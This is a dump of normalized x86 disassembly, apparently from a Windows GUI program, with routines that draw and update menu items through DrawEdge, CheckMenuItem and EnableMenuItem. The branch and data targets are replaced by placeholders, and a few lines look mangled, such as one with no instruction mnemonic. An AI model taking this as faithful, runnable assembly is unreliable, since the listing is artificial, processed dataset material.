mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0x80000012
call sub_40e9f8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_402cd8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x34 ]
cmp eax [ edx + 0x34 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_40f388
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x60 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x24 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
call sub_4078b8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x58 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x54 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_40ed4c
mov eax [ ebp + 0x8 ]
or [ eax - 0x60 ] 0x100000
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40fc38
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x40 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f964
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x58 ]
lea edi [ edx - 0x10 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov al [ eax + 0x2d ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_403080
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_40f744
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_40e9f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
call sub_44c070
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x60 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x24 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
call sub_4078b8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408c64
lea eax [ ebp - 0x4 ]
call sub_44cae0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ax [ eax + 0x54 ]
call sub_40672c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_40fa08
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ ebp - 0x4 ]
call sub_4078b8
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_408d94
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_409b88
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x3c ]
mov [ ebp - 0x8 ] eax
sub_408df8
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_408e44
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_409075
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov bx 0xfff3
call sub_44c24c
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov [ ebp - 0x1a ] 0x0
mov [ ebp - 0x1a ] 0x1
push ebp
call sub_408df8
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
mov [ ebp - 0x19 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_409b88
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
call sub_408d94
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24 ]
mov edx r-xdata
call sub_44ce70
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x34 ] 0xffffffff
jg r-xdata
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
mov [ ebp - 0x19 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x34 ]
xor ecx ecx
mov edx 0x10
call sub_44bd90
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov [ ebp - 0xd ] 0x0
jmp r-xdata
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x18 ]
mov al [ eax + 0x50 ]
mov [ ebp - 0xd ] al
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x54 ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x24 ]
call sub_44cb78
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x54 ]
call sub_40672c
mov ecx [ ebp - 0x38 ]
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x24 ]
call sub_44cdac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40907c
lea eax [ ebp - 0x38 ]
call sub_44cae0
lea eax [ ebp - 0x24 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
xor eax eax
mov al [ ebp - 0xd ]
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x34 ]
push eax
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4078b8
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x34 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x9a ] 0x0
je r-xdata
sub_4090a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3c ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] al
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4090d4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_44ce70
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x24
mov edx [ ebp - 0x8 ]
call sub_44cb34
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_40910c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_409348
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_409374
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0xc ]
mov al [ eax + 0x33 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x33 ]
jne r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_409180
sub_409180
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4077f8
push eax
call CheckMenuItem
mov eax [ ebp - 0x4 ]
call sub_40910c
sub_4091f8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2d ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2d ] al
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_409348
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4077f8
push eax
call EnableMenuItem
sub_40929c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x33 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x33 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_409818
mov edx eax
mov cl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_407778
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40910c
sub_409304
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_409348
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_409374
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_406654
sub_4093ac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
cmp ax [ ebp - 0x6 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov ax [ ebp - 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4093e0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x32 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x32 ] al
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_409410
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x34 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_409440
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0xffffffff
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_409818
mov [ ebp - 0x8 ] eax
sub_409474
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_409348
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_409440
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x10 ]
dec eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_409874
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_409600
sub_4094e4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_409348
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn 0x8
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_409374
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_40952c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c200
mov edx [ ebp - 0xc ]
call sub_409474
mov esp ebp
pop ebp
retn
sub_409558
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2e ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2e ] al
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_409348
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_409374
mov [ eax + 0x2e ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_409374
cmp [ eax + 0x2e ] 0x0
je r-xdata
sub_4095e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x1c ]
sub_409600
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_406654
mov eax [ ebp - 0x8 ]
dec eax
js r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x50 ] eax
mov eax [ ebp - 0xc ]
mov cl [ eax + 0x33 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407778
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_43c550
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x58 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x7c ] eax
mov [ edx + 0x78 ] sub_40990c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x50 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_409348
dec eax
sete dl
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4076c8
mov edx [ ebp - 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_43c464
mov al [ eax + 0x33 ]
mov edx [ ebp - 0xc ]
cmp al [ edx + 0x33 ]
jbe r-xdata
mov edx [ ebp - 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_43c464
mov dl [ eax + 0x33 ]
mov eax [ ebp - 0xc ]
call sub_40929c
sub_4096ec
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
